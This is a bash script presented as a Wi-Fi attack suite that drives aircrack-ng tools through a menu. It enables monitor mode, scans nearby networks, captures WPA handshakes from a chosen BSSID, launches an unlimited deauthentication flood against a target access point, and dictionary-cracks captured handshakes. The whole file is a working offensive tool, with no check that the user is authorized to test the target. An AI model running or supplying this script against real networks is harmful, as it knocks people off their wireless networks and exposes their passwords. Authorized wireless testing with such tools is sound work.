#!/bin/bash

# Define Colors
red="\033[38;5;196m"
green="\033[38;5;82m"
yellow="\033[0;33m"
blue="\033[38;5;51m"
reset="\033[0m"

# Clear Screen and Display Title
clear
toilet -f mono12 -F metal -W "_Wifi...Attack_" | lolcat
echo -e "ADVANCED WIRELESS ATTACK SUITE" | lolcat
echo -e ""
echo -e "Created by : Rithisha" | lolcat
cowsay -f turkey rithishapoomalai99@gmail.com | lolcat
sleep 2

# Ensure script is run as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${red}Please run as root${reset}"
  exit 1
fi

while true; do
    sudo airmon-ng check kill
    figlet "CHOOSE A METHOD FOR WIRELESS PENTESTING" -c | lolcat

    echo -e "${red}[1] WIFI OFFENSIVE SCANNING AND ENUMERATION${reset}"
    echo -e "${green}[2] WIFI DDOS ATTACK${reset}"
    echo -e "${blue}[3] DECRYPT CAP FILES${reset}"
    echo -e "\n"

    read -p "Choose: " method

    sleep 2

    echo -e "\nLISTING YOUR NETWORK INTERFACES ..." | lolcat
    sleep 1
    iwconfig
    echo -e "\nENTER YOUR NETWORK INTERFACE (e.g., wlan0): " | lolcat
    read netint

    sudo airmon-ng start "$netint"

    # Dynamically detect the monitor mode interface
    mon_interface=$(iwconfig 2>/dev/null | grep -B 1 "Mode:Monitor" | head -n1 | awk '{print $1}')

    if [ -z "$mon_interface" ]; then
        echo -e "${red}Failed to detect monitor mode interface. Exiting...${reset}"
        exit 1
    else
        echo -e "${green}Monitor mode enabled on interface: $mon_interface${reset}"
    fi

    case $method in
        1)
            echo -e "\nSCANNING FOR ALL THE WIFI NETWORKS AROUND YOU !!!" | lolcat
            sleep 3
            sudo timeout 30s airodump-ng "$mon_interface"
            sleep 2

            read -p $'\nENTER TARGET\'S BSSID TO SCAN: ' bssid
            read -p $'\nENTER THE CHANNEL NUMBER OF THE TARGET: ' channel

            read -p $'\nENTER THE NAME FOR THE CAPTURE FILE (without extension): ' cap_filename
            save_path="$(pwd)/${cap_filename}.cap"

            echo -e "\n${yellow}Open a new terminal and initiate the DDOS attack for faster handshake capture.${reset}"
            sleep 8

            echo -e "\nCAPTURING HANDSHAKE... Press Ctrl+C when handshake is captured." | lolcat
            sudo airodump-ng --bssid "$bssid" --channel "$channel" -w "$cap_filename" "$mon_interface"

            echo -e "\n${green}File saved in this path: ${save_path}${reset}" | lolcat
            sleep 2
            sudo airmon-ng stop "$mon_interface"
            ;;

        2)
            echo -e "\nSTARTING DDOS USING AIREPLAY-NG ...." | lolcat
            read -p "Enter the target BSSID for DDOS: " bssid

            echo -e "\nStarting DDOS attack on BSSID: $bssid" | lolcat
            sudo aireplay-ng --deauth 0 -a "$bssid" "$mon_interface"

            sudo airmon-ng stop "$mon_interface"
            ;;

        3)
            read -p $'\nENTER THE NAME OF THE CAP FILE TO DECRYPT: ' cap_file
            read -p $'\nENTER THE PASSWORD FILE TO BRUTEFORCE: ' dict_file
            echo -e "\nCRACKING WIFI PASSWORD USING AIRCRACK-NG ..." | lolcat
            sleep 2
            aircrack-ng "$cap_file" -w "$dict_file"
            ;;

        *)
            echo -e "${red}INVALID OPTION. Please choose a valid number.${reset}"
            ;;
    esac

    echo -e "\n${yellow}Want to attack more Wi-Fi targets?${reset}"
    echo -e "${green}1. CONTINUE${reset}"
    echo -e "${red}2. EXIT${reset}"
    read -p "Choose an option: " conti

    if [ "$conti" -ne 1 ]; then
        cowsay -f kiss "COME BACK SOON !!!" | lolcat
        break
    fi

    sleep 2
done

